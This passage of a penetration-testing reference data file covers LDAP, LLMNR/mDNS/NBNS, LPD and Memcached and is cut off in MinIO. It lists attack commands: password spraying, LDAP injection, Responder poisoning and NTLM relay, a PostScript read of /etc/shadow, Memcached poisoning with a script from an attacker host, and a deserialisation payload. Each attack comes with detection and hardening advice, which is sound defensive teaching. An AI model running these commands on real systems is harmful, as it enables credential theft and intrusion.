          "Only the control plane and the administrators should reach 6443. The kubelet ports should accept the API server and nothing else.",
      },
      {
        title: "Protect the kubelet",
        detail:
          "Set anonymous authentication to false, authorise kubelet requests, close 10255, and refuse kubelet traffic that does not come from the API server.",
      },
      {
        title: "Shorten token lifetimes",
        detail:
          "Use projected service account tokens with an expiry instead of the legacy long lived secret, and stop mounting them into pods that do not need the API.",
      },
      {
        title: "Enable audit logging",
        detail:
          "Turn on the API server audit log at request level and ship it off the cluster, then alert on secret reads, exec calls and role binding changes.",
      },
    ],
    tools: ["nmap", "curl", "kubectl", "kube-hunter", "trivy", "metasploit"],
  },
  {
    slug: "ldap",
    name: "LDAP",
    port: 389,
    protocol: "tcp",
    risk: "high",
    tags: ["directory", "authentication", "enterprise"],
    summary:
      "LDAP is the directory protocol that sits behind Active Directory, most single sign-on systems and a great deal of internal tooling. Plain LDAP on 389 has no transport security, and the bind operation is a clean oracle: it either succeeds or fails, which makes credential spraying against it trivial. The directory is also a map of the organisation, because it names the users, the groups and the systems they can reach. A correct LDIF filter is often worth more than a broken password.",
    connect: [
      {
        label: "ldapsearch",
        command: "ldapsearch -x -H ldap://<target> -s base -b '' namingContexts",
        detail:
          "An anonymous search of the root DSE usually works and returns the naming contexts and the supported extensions, which tells you what kind of directory this is.",
      },
      {
        label: "Authenticated bind",
        command: "ldapwhoami -x -H ldap://<target> -D \"<domain>\\\\<user>\" -w <password>",
        detail:
          "A successful bind proves the credential is valid. The empty password bind is worth trying as well, because some configurations treat it as an anonymous bind rather than a login.",
      },
    ],
    recon: [
      {
        title: "Service detection",
        command: "nmap -sV -p 389,636,3268,3269 --script ldap-rootdse <target>",
        detail:
          "The root DSE script returns the naming contexts, the supported controls and the vendor. Ports 3268 and 3269 are the global catalog for large Active Directory environments.",
      },
      {
        title: "Read the root DSE",
        command: "ldapsearch -x -H ldap://<target> -s base -b '' namingContexts supportedLDAPVersion supportedControl",
        detail:
          "The root DSE is readable anonymously on most directories and it tells you the domain names and whether the server supports paging or the directory sync control.",
      },
      {
        title: "Check the TLS sibling",
        command: "openssl s_client -connect <target>:636 -brief </dev/null",
        detail:
          "If 636 answers, you have StartTLS or LDAPS available. Comparing what the server exposes over 389 and over 636 shows exactly what the plain-text listener is giving away.",
      },
    ],
    enumeration: [
      {
        title: "Enumerate accounts",
        command: "ldapsearch -x -H ldap://<target> -b \"dc=<domain>,dc=<tld>\" \"(objectClass=person)\" sAMAccountName",
        detail:
          "The attribute list matters. Asking for a narrow set of attributes returns results far faster and reduces the noise in the output.",
      },
      {
        title: "Enumerate group membership",
        command: "ldapsearch -x -H ldap://<target> -b \"dc=<domain>,dc=<tld>\" \"(objectClass=group)\" member",
        detail:
          "Group membership shows where the privileges are and gives you the distinguished names you need for the next query.",
      },
      {
        title: "Look for privileged accounts",
        command: "ldapsearch -x -H ldap://<target> -b \"dc=<domain>,dc=<tld>\" \"(memberOf=CN=Domain Admins,CN=Users,DC=<domain>,DC=<tld>)\" sAMAccountName",
        detail:
          "Querying by memberOf finds the accounts that sit in a specific privileged group, which is a much smaller and more useful list than every user.",
      },
    ],
    attacks: [
      {
        title: "Credential spraying against the bind",
        severity: "high",
        command: "hydra -l <user> -P /usr/share/wordlists/common-passwords.txt ldap://<target> -s 389 -f",
        detail:
          "Directory services often have no lockout on bind attempts, so spraying is limited only by the KDC lockout policy and the patience of the defender. Each attempt is a single clean boolean.",
        detection:
          "A burst of failed binds from one address, or from one account against many addresses, and event 4625 on domain controllers.",
        fix: "Enforce account lockout, alert on bind failures in volume, and use a rate limiter in front of the directory for service accounts.",
      },
      {
        title: "Anonymous bind against a permissive directory",
        severity: "high",
        command: "ldapsearch -x -H ldap://<target> -b \"dc=<domain>,dc=<tld>\" \"(objectClass=*)\" | head -50",
        detail:
          "When anonymous binding is allowed, the entire directory is readable without a credential. Older Active Directory installations shipped with that behaviour, and OpenLDAP defaults to it as well.",
        detection:
          "Anonymous bind events and searches from hosts that have no legitimate reason to query the directory.",
        fix: "Disable anonymous binds in the directory configuration and in Active Directory, and require authenticated searches for anything beyond the root DSE.",
      },
      {
        title: "LDAP injection through a web application",
        severity: "high",
        command: "curl -s 'http://<target>/search?user=*)(objectClass=*' -H 'Accept: application/json'",
        detail:
          "Applications that paste user input into a filter without escaping allow the filter to be rewritten. A wildcard filter returns everything, and a crafted one can bypass the authorisation check in the same query.",
        detection:
          "Filter parse errors in the directory log and unexpected wildcard characters in filter strings arriving at the server.",
        fix: "Use the directory client's escaping helper for every filter value, bind the application with a read-only account, and never concatenate input into a filter.",
      },
    ],
    postEx: [
      {
        title: "Dump the directory to LDIF",
        severity: "high",
        command:
          "ldapsearch -x -H ldap://<target> -b \"dc=<domain>,dc=<tld>\" \"(objectClass=*)\" > ldap-dump.ldif\nwc -l ldap-dump.ldif\ngrep '^dn:' ldap-dump.ldif | head -40",
        detail:
          "A full dump gives you the account list, the group structure and the computer accounts, which is the raw material for everything from spraying to a bloodhound collection.",
        detection:
          "Search requests with an objectClass wildcard and a wide base, which stand out clearly in the directory access log.",
        fix: "Restrict anonymous and general search access, and monitor for wildcard searches that return large result sets.",
      },
      {
        title: "Find privileged accounts and nested groups",
        severity: "medium",
        command:
          "ldapsearch -x -H ldap://<target> -b \"dc=<domain>,dc=<tld>\" \"(memberOf=*Admin*)\" sAMAccountName distinguishedName",
        detail:
          "Nested groups hide privilege from simple queries. Reading the member attribute of every privileged group and then recursing shows the accounts that are effectively administrators.",
        detection:
          "Searches that filter on privileged group membership from a host that is not an administration server.",
        fix: "Keep privileged groups small and documented, and review their membership on a schedule.",
      },
      {
        title: "Reset a password through the directory",
        severity: "high",
        command:
          "cat > reset.ldif <<'EOF'\ndn: uid=<user>,dc=<domain>,dc=<tld>\nchangetype: modify\nreplace: userPassword\nuserPassword: <new-password>\nEOF\nldapmodify -x -H ldap://<target> -D \"<bind-dn>\" -w <password> -f reset.ldif",
        detail:
          "An account with write access to the directory can change a password directly, without going through the password reset workflow that would send an alert to the owner.",
        detection:
          "Modify operations against password attributes from accounts that do not normally write to the directory, and mismatches between reset notifications and change times.",
        fix: "Separate read and write roles in the directory, alert on password attribute writes, and require that resets flow through the identity system.",
      },
    ],
    commands: [
      { command: "ldapsearch -x -H ldap://<target> -s base -b '' namingContexts supportedLDAPVersion", description: "Reads the root DSE of the directory." },
      { command: "ldapsearch -x -H ldap://<target> -b \"dc=<domain>,dc=<tld>\" \"(objectClass=person)\" sAMAccountName", description: "Enumerates the accounts in the directory." },
      { command: "ldapsearch -x -H ldap://<target> -b \"dc=<domain>,dc=<tld>\" \"(objectClass=group)\" member", description: "Enumerates groups and their members." },
      { command: "ldapwhoami -x -H ldap://<target> -D '<domain>\\<user>' -w <password>", description: "Verifies a bind and reports the identity behind it." },
      { command: "ldapsearch -x -H ldap://<target> -b \"dc=<domain>,dc=<tld>\" \"(userPassword=*)\" userPassword", description: "Finds accounts whose password attribute is stored in a readable form." },
      { command: "ldapmodify -x -H ldap://<target> -D '<bind-dn>' -w <password> -f reset.ldif", description: "Modifies a directory entry from an LDIF file." },
      { command: "ldapsearch -x -H ldap://<target> -b 'cn=monitor' -s base", description: "Reads the OpenLDAP monitor counters." },
      { command: "hydra -l <user> -P <file> ldap://<target> -s 389 -f", description: "Sprays a password list against the bind operation." },
      { command: "nmap -p 389 --script ldap-rootdse,ldap-search <target>", description: "Fingerprints the directory and runs a basic search." },
      { command: "ldapsearch -x -H ldap://<target> -b \"dc=<domain>,dc=<tld>\" \"(objectClass=computer)\" cn", description: "Lists the domain-joined machines." },
    ],
    hardening: [
      {
        title: "Require encryption",
        detail:
          "Use LDAPS on 636 or StartTLS on 389 so that credentials and directory contents are never sent in clear text, and refuse plaintext binds on the listener.",
      },
      {
        title: "Disable anonymous binds",
        detail:
          "Turn off anonymous binding in the directory and in Active Directory. Where the root DSE must stay readable, restrict it with an access control rule.",
      },
      {
        title: "Separate service accounts from humans",
        detail:
          "Give each application its own bind account with read access to only the tree it needs, so a leaked credential does not expose the whole directory.",
      },
      {
        title: "Alert on bind failures",
        detail:
          "Monitor failed bind attempts by source and by account. A spray is obvious in the logs if someone is reading them.",
      },
      {
        title: "Escape every filter",
        detail:
          "Use the escaping function of the directory client in each application, and treat filter injection as a code injection bug in the review process.",
      },
      {
        title: "Log searches as well as writes",
        detail:
          "Directory access logs should record searches, not only modifications. The interesting event in an incident is often a bulk read.",
      },
    ],
    tools: ["nmap", "ldapsearch", "hydra", "crackmapexec", "netexec", "bloodhound-ce"],
  },
  {
    slug: "llmnr-mdns-nbns",
    name: "LLMNR / mDNS / NBNS",
    port: 5355,
    protocol: "udp/tcp",
    risk: "medium",
    tags: ["name-resolution", "poisoning", "recon"],
    summary:
      "LLMNR, mDNS and NBNS are the fallback name resolution protocols a machine reaches for when its DNS server cannot answer a question. They work by broadcasting, so the reply is unauthenticated and the first answer wins. A host that replies for a name it does not own can redirect traffic to itself, and the traffic it captures is exactly the credential material that relay attacks need. The ports are scattered: LLMNR uses UDP 5355, mDNS uses UDP 5353 and NetBIOS uses UDP 137 and 138, so a single port check never tells the whole story.",
    connect: [
      {
        label: "Responder listener",
        command: "python3 Responder.py -I eth0 -v",
        detail:
          "Responder listens on all three protocols at once and prints every name the network asks about. It is the fastest way to turn a segment into a list of targets.",
      },
      {
        label: "NetBIOS session",
        command: "smbclient -L //<target> -N",
        detail:
          "The anonymous session attempt returns the NetBIOS computer name, which on a domain member is often the hostname and is a strong hint for the rest of the reconnaissance.",
      },
    ],
    recon: [
      {
        title: "Detect the protocols",
        command: "nmap -sU -p 137,138,5353,5355 --script nbns-status,dns-sd-service <target>",
        detail:
          "The nbns-status script returns the NetBIOS name and the workgroup. The dns-sd-service script lists the services advertised over mDNS, which on a workstation often includes printers and AirPlay targets.",
      },
      {
        title: "Check the local resolution order",
        command: "cat /etc/nsswitch.conf",
        detail:
          "The hosts line shows whether the machine falls back to LLMNR or mDNS for short names. On a client that also means it is willing to ask the whole segment for an answer.",
      },
      {
        title: "Map the broadcast domain",
        command: "sudo nmap -sU -p 5355 --script dns-sd-service 10.0.0.0/24 --min-rate 1000",
        detail:
          "Broadcast protocols ignore the subnet mask, so a scanner may reach further than the address range suggests. Check the actual broadcast domain with the interface configuration before drawing conclusions.",
      },
    ],
    enumeration: [
      {
        title: "Collect the names the segment asks about",
        command: "python3 Responder.py -I eth0 -v",
        detail:
          "Every logged query is a hostname that a machine could not resolve through DNS. That list is a set of internal names you can try to use directly.",
      },
      {
        title: "Enumerate NetBIOS names",
        command: "nbtscan -r <ip-range>",
        detail:
          "nbtscan sweeps the NetBIOS name service and prints the machine names with their MAC addresses, which lets you spot a name that is duplicated across a network.",
      },
      {
        title: "Query mDNS directly",
        command: "dig @224.0.0.251 -p 5353 _services._dns-sd._udp.local +noall +answer",
        detail:
          "The multicast DNS query returns every service type advertised on the segment. Enumerating _http._tcp.local is often a fast way to find internal web interfaces.",
      },
    ],
    attacks: [
      {
        title: "Name resolution poisoning",
        severity: "high",
        command: "python3 Responder.py -I eth0 -A -v",
        detail:
          "The listener answers queries for names that do not exist, and the ARP mode makes the poisoned address win the local cache as well. The victim connects to the attacker and sends credentials to a host that should never have received them.",
        detection:
          "The same name queried repeatedly from several machines, ARP replies arriving for addresses the responder does not own, and LLMNR traffic volume that jumps during a login event.",
        fix: "Disable LLMNR, NBNS and multicast DNS through group policy, block UDP 5355, 5353 and 137 and TCP 138 and 139 at the firewall, and issue short names through DHCP instead.",
      },
      {
        title: "Credential relay from a poisoned request",
        severity: "high",
        command:
          "python3 Responder.py -I eth0 -v\nimpacket-ntlmrelayx -t <target> -smb2 -smb2-port 445",
        detail:
          "The victim authenticates to the poisoned name, and the captured challenge and response are relayed to a real service. The attacker never sees a password and the session is still valid.",
        detection:
          "Logon events where the source workstation is not the expected one for the account, and SMB sessions that appear without a matching logon from that host.",
        fix: "Enable SMB signing and full authentication, patch the relay paths, and disable the legacy protocols above so there is nothing to poison.",
      },
      {
        title: "Duplicate name and service impersonation",
        severity: "medium",
        command: "python3 Responder.py -I eth0 -v -I eth0 --disable-dns",
        detail:
          "Claiming a NetBIOS computer name that is already in use lets the attacker intercept SMB traffic intended for the real machine, and it works even when LLMNR and mDNS are switched off.",
        detection:
          "Event 4625 and 4634 pairs with a source workstation that does not match the host, and NetBIOS name registration conflicts on the segment.",
        fix: "Block NetBIOS at the network edge, use SMB signing, and monitor for the same computer name appearing on two addresses at once.",
      },
    ],
    postEx: [
      {
        title: "Relay a captured hash to an authenticated service",
        severity: "high",
        command:
          "impacket-ntlmrelayx -t <target> -smb2 -smb2-port 445 -rf allow\nimpacket-ntlmrelayx -t <target> -smb2 -smb2-port 445",
        detail:
          "The relay tool lists the targets it can authenticate to and then performs the relay for each one. A successful relay is a valid session on a remote machine with no password involved.",
        detection:
          "A new session on a server that has no matching interactive logon, and SMB traffic from a host that does not normally talk to that server.",
        fix: "Require SMB signing, disable NTLM where possible, and use the newer channel binding features on the server side.",
      },
      {
        title: "Mine the poison log for target names",
        severity: "medium",
        command: "cat Responder-*.log | grep -E 'NBT-NS|LLMNR|MDNS' | sort -u",
        detail:
          "The log is a list of internal hostnames that were being looked up, often including management interfaces and build servers that do not appear in any inventory.",
        detection:
          "This is a post-exploitation action on a segment you already hold, so the signal is the poisoning traffic rather than the log itself.",
        fix: "Fix the resolution problem at the source so that the segment stops asking for names that only DNS can answer.",
      },
      {
        title: "Use the poisoned name to intercept a session",
        severity: "high",
        command: "smbclient //<poisoned-name> -U '<domain>/<user>%<password>'",
        detail:
          "Once the name points at your listener, the client authenticates to you. Whatever the application sends next, including a second factor prompt, lands in front of you.",
        detection:
          "Failed or unusual authentication attempts against a server that the client normally reaches by a different path.",
        fix: "Disable the fallback protocols, require SMB signing, and use name resolution through DNS only with strict name and IP matching.",
      },
    ],
    commands: [
      { command: "python3 Responder.py -I eth0 -v", description: "Listens for LLMNR, NBNS and mDNS queries and logs the names." },
      { command: "python3 Responder.py -I eth0 -A -v", description: "Adds ARP spoofing so the poisoned address also wins the cache." },
      { command: "nmap -sU -p 137 --script nbns-status <target>", description: "Returns the NetBIOS name and workgroup of a host." },
      { command: "nmap -sU -p 5353 --script dns-sd-service <target>", description: "Lists the services advertised over mDNS." },
      { command: "nbtscan -r <ip-range>", description: "Scans a range for NetBIOS names and MAC addresses." },
      { command: "smbclient -L //<target> -N", description: "Anonymous SMB session, which returns the NetBIOS name and shares." },
      { command: "dig @224.0.0.251 -p 5353 _services._dns-sd._udp.local +noall +answer", description: "Enumerates the mDNS service types on the segment." },
      { command: "dig @224.0.0.251 -p 5353 <service>._tcp.local +short", description: "Resolves one mDNS service name to its addresses." },
      { command: "cat /etc/nsswitch.conf", description: "Shows whether the host falls back to LLMNR or mDNS." },
      { command: "ip neigh show", description: "Lists the ARP cache, which shows a competing entry for a poisoned name." },
    ],
    hardening: [
      {
        title: "Switch off the fallback protocols",
        detail:
          "Apply the domain policy that turns off multicast name resolution and disables NetBIOS over TCP/IP. Do it for both the computer and the domain controller objects.",
      },
      {
        title: "Filter them at the perimeter",
        detail:
          "Drop UDP 5355, 5353 and 137 and TCP 138 and 139 on the way out of the network. Nothing outside should ever answer for an internal name.",
      },
      {
        title: "Use DNS for short names",
        detail:
          "Issue short names through the DHCP suffix option so that hosts never need to broadcast a lookup, which removes the reason the fallback protocols exist.",
      },
      {
        title: "Enable SMB signing",
        detail:
          "Require SMB signing on clients and servers so that relayed or tampered sessions are rejected rather than accepted.",
      },
      {
        title: "Segment the management network",
        detail:
          "Keep management interfaces on a VLAN where broadcast name resolution is blocked, so a compromised host cannot poison the rest of the estate.",
      },
      {
        title: "Watch for competing answers",
        detail:
          "Alert on a single IP answering for more than one name, and on a host answering for a name that does not belong to its naming pattern.",
      },
    ],
    tools: ["nmap", "responder", "impacket", "smbclient", "nbtscan", "dig"],
  },
  {
    slug: "lpd",
    name: "LPD",
    port: 515,
    protocol: "tcp",
    risk: "medium",
    tags: ["printing", "legacy", "spooler"],
    summary:
      "The Line Printer Daemon is a Unix print spooler that has barely changed since the 1980s, and it is still reachable on port 515 in a lot of environments. It has no authentication of its own, so anyone who can reach it can queue jobs and read the queue. The interesting part is what happens to the job afterwards, because the payload is processed by a print pipeline that may run privileged helpers. Legacy and quiet, but it is a genuinely useful pivot when it is open.",
    connect: [
      {
        label: "CUPS client tools",
        command: "lpstat -h <target> -a",
        detail:
          "lpstat talks to a remote CUPS or legacy lpd server and prints the job status for every printer it knows about.",
      },
      {
        label: "Raw protocol probe",
        command: "printf '\\x00' | nc -nv <target> 515",
        detail:
          "The daemon expects a single opcode byte and answers an invalid one with an error string, which confirms the service even though no banner is sent.",
      },
    ],
    recon: [
      {
        title: "Service detection",
        command: "nmap -sV -p 515,631,9100 <target>",
        detail:
          "515 is the legacy listener, 631 is CUPS and 9100 is the raw print port. The fingerprint of 9100 is usually a silent connection that accepts anything, which is itself the finding.",
      },
      {
        title: "Probe the protocol",
        command: "printf '\\x03' | nc -nv <target> 515",
        detail:
          "Sending an opcode the daemon does not expect produces a short error reply. That reply is enough to distinguish a real spooler from a filtered port.",
      },
      {
        title: "Check the CUPS web interface",
        command: "curl -s http://<target>:631/ | head -30",
        detail:
          "The CUPS interface lists printers and, on older versions, allows administration without a password. It is usually the most productive path on the printer host.",
      },
    ],
    enumeration: [
      {
        title: "List the printers",
        command: "lpstat -h <target> -p <printer> -d",
        detail:
          "The reply includes the printer name, the description and the device URI, which often contains a hostname or a share path that gives away the internal network.",
      },
      {
        title: "Read the queue",
        command: "lpq -h <target> -P <printer>",
        detail:
          "The queue lists job identifiers, owners and job names. Owner names are usually real usernames, and job names are often the title of a document somebody was printing.",
      },
      {
        title: "Check the CUPS configuration",
        command: "curl -s http://<target>:631/printers/<printer>.conf | grep -E 'DeviceURI|User|AuthInfo'",
        detail:
          "The printer configuration file exposes the device URI and any authentication configured for it, which frequently points at a file share or a network printer with no access control of its own.",
      },
    ],
    attacks: [
      {
        title: "Unauthenticated job injection",
        severity: "medium",
        command: "lpr -h <target> -P <printer> payload.txt",
        detail:
          "Any client that can reach the spooler can queue work. The spooled file is written to disk and later handed to the filters, so it is a file write into the print server's filesystem.",
        detection:
          "Jobs appearing from accounts and addresses that do not print, and a queue that grows without a corresponding user at the device.",
        fix: "Restrict who may print with the lpadmin and lpaccess rules, disable the listener where printing is not needed, and monitor the queue for jobs from unexpected sources.",
      },
      {
        title: "PostScript and PJL payload injection",
        severity: "high",
        command:
          "cat payload.ps | nc -nv <target> 9100\nlpr -h <target> -P <printer> payload.ps",
        detail:
          "PostScript is a programming language and some interpreters allow file writes and command execution. Where the raw port 9100 is open the payload goes straight to the device with no queue and no audit trail.",
        detection:
          "Unusually large or binary jobs, jobs whose names end in unusual extensions, and Ghostscript errors in the spooler log.",
        fix: "Run the interpreter in safe mode, deny file access to the print pipeline, and block the raw port at the firewall so that only the spooler can reach the device.",
      },
      {
        title: "Queue manipulation and disruption",
        severity: "low",
        command: "lprm -h <target> -P <printer> <job-id>",
        detail:
          "The same unauthenticated access allows jobs to be cancelled. For a printer that produces labels, tickets or prescriptions, removing a job is a denial of service with a business impact.",
        detection:
          "Job cancellations arriving from addresses that are not the submitting user, and a queue that empties unexpectedly.",
        fix: "Limit job management rights to the owners of the jobs, and audit cancellations in the spooler log.",
      },
    ],
    postEx: [
      {
        title: "Read other users' spooled files",
        severity: "medium",
        command: "lpq -h <target> -P <printer> -a",
        detail:
          "Queue listings show job names and owners. Where the spooler does not restrict listing, the job content itself may also be retrievable, and print jobs are frequently documents nobody intended to publish.",
        detection:
          "Queue queries from hosts that are not printing stations.",
        fix: "Restrict queue visibility by user, and keep printed material out of the same trust boundary as the print server.",
      },
      {
        title: "Ride the print pipeline",
        severity: "critical",
        command:
          "cat > payload.ps <<'EOF'\n%!\n(/etc/shadow) (r) file\nEOF\nlpr -h <target> -P <printer> payload.ps",
        detail:
          "Where the PostScript interpreter is not running in safe mode, a job can read or write files as the spooler user. Many spoolers run as a privileged account for exactly this reason.",
        detection:
          "New files appearing in the spool directory, interpreter errors, and jobs whose content is a short program rather than a document.",
        fix: "Use the safe mode flag, run the spooler without privilege, keep the spool directory on a separate mount, and never give the print service account access to system files.",
      },
      {
        title: "Mine printed documents for secrets",
        severity: "medium",
        command: "lpstat -h <target> -o -W all",
        detail:
          "Jobs that were printed and kept in the queue carry whatever the organisation prints, and that set routinely includes access tickets, invoices and personal data.",
        detection:
          "Long lived jobs that nobody collects, which usually means the printing of something sensitive.",
        fix: "Purge old jobs automatically, restrict the spool directory, and treat print queues as a data store with the same care as a database.",
      },
    ],
    commands: [
      { command: "lpstat -h <target> -a", description: "Print queue status for every printer on the host." },
      { command: "lpstat -h <target> -d", description: "Shows the default printer on the remote host." },
      { command: "lpstat -h <target> -p <printer>", description: "Queries the capabilities of a printer." },
      { command: "lpq -h <target> -P <printer>", description: "Lists the queue in the classic lpd format." },
      { command: "lpr -h <target> -P <printer> file.txt", description: "Queues a job on the remote printer." },
      { command: "lprm -h <target> -P <printer> <job-id>", description: "Removes a job from the remote queue." },
      { command: "lpstat -h <target> -o", description: "Lists the jobs owned by the current user." },
      { command: "printf '\\x00' | nc -nv <target> 515", description: "Probes the daemon, which replies with a protocol error." },
      { command: "cat job.ps | nc -nv <target> 9100", description: "Sends a PostScript payload straight to the raw print port." },
      { command: "curl -s http://<target>:631/printers/<printer>.conf", description: "Reads the printer configuration from the CUPS interface." },
    ],
    hardening: [
      {
        title: "Retire the legacy listener",
        detail:
          "Run CUPS on 631 only and refuse connections on 515. The legacy protocol has no useful feature that the modern one lacks.",
      },
      {
        title: "Restrict who may print",
        detail:
          "Use the lpadmin and lpaccess rules so that only authorised users and groups can submit and manage jobs, and require authentication on the web interface.",
      },
      {
        title: "Run the spooler unprivileged",
        detail:
          "The print service account should not be root, and it should not be able to read /etc/shadow, application configuration or home directories.",
      },
      {
        title: "Keep the interpreter in safe mode",
        detail:
          "Enable safe mode in the PostScript interpreter so that file access and command execution are denied, and keep the interpreter patched.",
      },
      {
        title: "Isolate printers on their own network",
        detail:
          "Printer and copier interfaces are a well known entry point because they are rarely patched and often sit on the same VLAN as the users who print.",
      },
      {
        title: "Log what is printed",
        detail:
          "Keep an audit of submissions with owner, size and job name. Printed content is a data flow, and it needs the same control as any other.",
      },
    ],
    tools: ["nmap", "netcat", "lpstat", "lpr", "cupsctl", "wireshark"],
  },
  {
    slug: "memcached",
    name: "Memcached",
    port: 11211,
    protocol: "tcp",
    risk: "critical",
    tags: ["cache", "in-memory", "nosql"],
    summary:
      "Memcached is a memory-only key and value store that sits in front of most web applications as a cache. It ships with a text protocol and, by default, with no authentication whatsoever, which makes a stray bind address equivalent to publishing the contents of the cache. The stats command is unauthenticated and gives a full inventory of what is being cached, and that inventory is where session tokens and cached API responses appear. Writing is possible as well, which turns a cache into an injection point.",
    connect: [
      {
        label: "Text protocol",
        command: "printf 'version\\r\\n' | nc -nv <target> 11211",
        detail:
          "The server answers with a single VERSION line. There is no banner on connect, so a command is the only way to confirm what you are talking to.",
      },
      {
        label: "memcstat",
        command: "memcstat --servers <target> --port 11211",
        detail:
          "memcstat wraps the stats command in a readable form and is the quickest way to see version, uptime and the connection counters.",
      },
    ],
    recon: [
      {
        title: "Service detection",
        command: "nmap -sV -p 11211 --script memcached-info <target>",
        detail:
          "The memcached-info script sends the stats command and reports the version, the uptime and the current item count. A large item count suggests the cache holds more than a cache should.",
      },
      {
        title: "Read the counters",
        command: "printf 'stats\\r\\nquit\\r\\n' | nc -nv <target> 11211 | head -30",
        detail:
          "The stats output covers memory, connections and command counters. The cmd_get and cmd_set values show how heavily the cache is being used by its real owner.",
      },
      {
        title: "Check for a local listener",
        command: "ss -lntp | grep 11211",
        detail:
          "On a host you already hold, this shows whether memcached is bound to the loopback interface or to every address, which is the difference between a good and a bad deployment.",
      },
    ],
    enumeration: [
      {
        title: "List the slabs",
        command: "printf 'stats slabs\\r\\nquit\\r\\n' | nc -nv <target> 11211 | grep -E 'chunk_size|total_pages'",
        detail:
          "Slab statistics show how the memory is divided up and which slab ids are in use. You need a slab id for the next step.",
      },
      {
        title: "Dump the key names",
        command: "printf 'stats items\\r\\nstats cachedump 1 100\\r\\nquit\\r\\n' | nc -nv <target> 11211",
        detail:
          "stats items lists the active slab ids and stats cachedump returns the keys inside one of them. The key names alone describe the application and its session scheme.",
      },
      {
        title: "Read one value",
        command: "printf 'get <key>\\r\\nquit\\r\\n' | nc -nv <target> 11211",
        detail:
          "The get command returns the stored value with its flags and length. Values are raw bytes, so pipe them through a decoder once you know what they are.",
      },
    ],
    attacks: [
      {
        title: "Unauthenticated read of the cached data",
        severity: "critical",
        command: "printf 'stats items\\r\\nstats cachedump 1 100\\r\\nquit\\r\\n' | nc -nv <target> 11211",
        detail:
          "There is no authentication by default, so every key is readable and every key is writable. Cached session identifiers, API responses and rendered pages are all there.",
        detection:
          "Any connection to the memcached port from a host that does not run the application, and a rise in cmd_get from an unusual source.",
        fix: "Enable SASL, bind to a private interface, and firewall the port so only the application tier can reach it.",
      },
      {
        title: "Session hijacking from cached session objects",
        severity: "critical",
        command: "printf 'stats cachedump 1 500\\r\\nquit\\r\\n' | nc -nv <target> 11211 | grep -iE 'sess|token|sid'",
        detail:
          "Applications that keep sessions in memcached store the session identifier and often the user object. Reading one and putting it in a cookie authenticates you as that user.",
        detection:
          "Session identifiers reused from a different source address, and a sudden spike in cache reads that line up with a login event.",
        fix: "Do not store session data in a shared cache, sign and encrypt session identifiers, and invalidate them server side on logout.",
      },
      {
        title: "Cache poisoning and injected responses",
        severity: "high",
        command: "printf 'set homepage 0 0 32\\r\\n<script src=\"//<ip>/x.js\"></script>\\r\\n' | nc -nv <target> 11211",
        detail:
          "Writing needs no credential either. Overwriting a cached page lets you serve content of your choosing to every user until the entry expires, and if the application deserialises cached values the write becomes code execution.",
        detection:
          "Unexpected set commands from outside the application hosts, and a change in the content of a cached page that nobody deployed.",
        fix: "Restrict write access to the application, use namespaced keys, and never deserialise values that came from a shared cache.",
      },
    ],
    postEx: [
      {
        title: "Replay a stolen session",
        severity: "critical",
        command: "curl -s -b 'session=<token>' https://<target>/account",
        detail:
          "A session identifier read from the cache is a bearer credential. Presenting it in the cookie header reproduces the authenticated session exactly.",
        detection:
          "A session used from a source address and user agent pair that does not match the original session's history.",
        fix: "Bind sessions to the client where possible, shorten their lifetime, and rotate the session identifier on every privilege change.",
      },
      {
        title: "Write a serialised payload for the application to load",
        severity: "critical",
        command: "printf 'set payload 0 0 46\\r\\nO:8:\"stdClass\":1:{s:4:\"exec\";s:2:\"id\";}\\r\\n' | nc -nv <target> 11211",
        detail:
          "PHP and Python applications that cache serialised objects will happily deserialise what they read back. A crafted object triggers the same gadget chains as any other deserialisation sink.",
        detection:
          "The application process deserialising a cache value and then spawning a child process or making an outbound connection.",
        fix: "Use a serialisation format that does not execute code, restrict the cache to the application tier, and treat any writable cache as an execution surface.",
      },
      {
        title: "Flush the cache and force a cold start",
        severity: "medium",
        command: "printf 'flush_all\\r\\n' | nc -nv <target> 11211",
        detail:
          "One command empties the cache and sends the full read load back to the database. It also destroys the evidence of what was cached before the intrusion.",
        detection:
          "A flush_all command from an address that does not host the application, and an immediate spike in database load.",
        fix: "Restrict the port to the application tier, alert on flush_all, and keep a short lived copy of the cache state for forensics.",
      },
    ],
    commands: [
      { command: "version", description: "Returns the server version string." },
      { command: "stats", description: "Counters for memory, connections and commands." },
      { command: "stats items", description: "Item counts per slab, which tells you where to look next." },
      { command: "stats cachedump <slab-id> <limit>", description: "Returns the key names inside a slab." },
      { command: "stats slabs", description: "Slab allocation and chunk sizes." },
      { command: "get <key>", description: "Reads a single value." },
      { command: "set <key> <flags> <exptime> <bytes>", description: "Writes a value with an optional expiry." },
      { command: "delete <key>", description: "Removes a key." },
      { command: "flush_all", description: "Empties the entire cache." },
      { command: "memcstat --servers <target> --port 11211", description: "Runs the stats command in a readable form." },
    ],
    hardening: [
      {
        title: "Turn on authentication",
        detail:
          "Enable SASL with a per application account and a strong secret. Be aware that SASL protects the credential, not the traffic, so it does not replace TLS.",
      },
      {
        title: "Never expose it to a network",
        detail:
          "Bind to a private interface and firewall the port so that only the application tier can reach it. Public memcached is one of the most common misconfigurations on the internet.",
      },
      {
        title: "Keep sensitive data out of the cache",
        detail:
          "Do not cache session identifiers, password reset tokens or personal data. A shared cache turns a modest application bug into a data breach.",
      },
      {
        title: "Do not deserialise cached values",
        detail:
          "If the application caches serialised objects, treat the cache as an execution surface. Use a data format that cannot construct behaviour when it is parsed.",
      },
      {
        title: "Monitor the command mix",
        detail:
          "Alert on flush_all, on unexpected set commands, and on connections from hosts outside the application inventory.",
      },
      {
        title: "Use TLS where the distance requires it",
        detail:
          "Terminate TLS in front of memcached or use a stunnel sidecar, so that the cache contents and the session data it holds are not readable on the network.",
      },
    ],
    tools: ["nmap", "netcat", "memcstat", "metasploit", "tcpdump"],
  },
  {
    slug: "minio-s3",
    name: "MinIO / S3",
    port: 9000,
    protocol: "tcp",
    risk: "high",
    tags: ["object-storage", "cloud", "s3-api"],
    summary:
      "MinIO implements the S3 object storage API on port 9000, with a separate administration console usually on 9001. The API is enormous and well documented, which means it is easy to use correctly and easy to misconfigure: a bucket with a public read policy hands its contents to anybody who guesses the name. The other common failure is credentials. MinIO prints the root access key at first start, and those keys end up in shell history, container logs and CI configuration. Finding either one gives access to the entire object store.",
    connect: [
      {
        label: "AWS CLI",
        command: "aws s3 ls --endpoint-url http://<target>:9000",
        detail:
          "The CLI speaks the S3 API and prints the buckets it can see. If it lists anything without credentials, the buckets are readable by anyone.",
      },
      {
        label: "MinIO client",
        command: "mc alias set minio http://<target>:9000 <access-key> <secret-key>",
        detail:
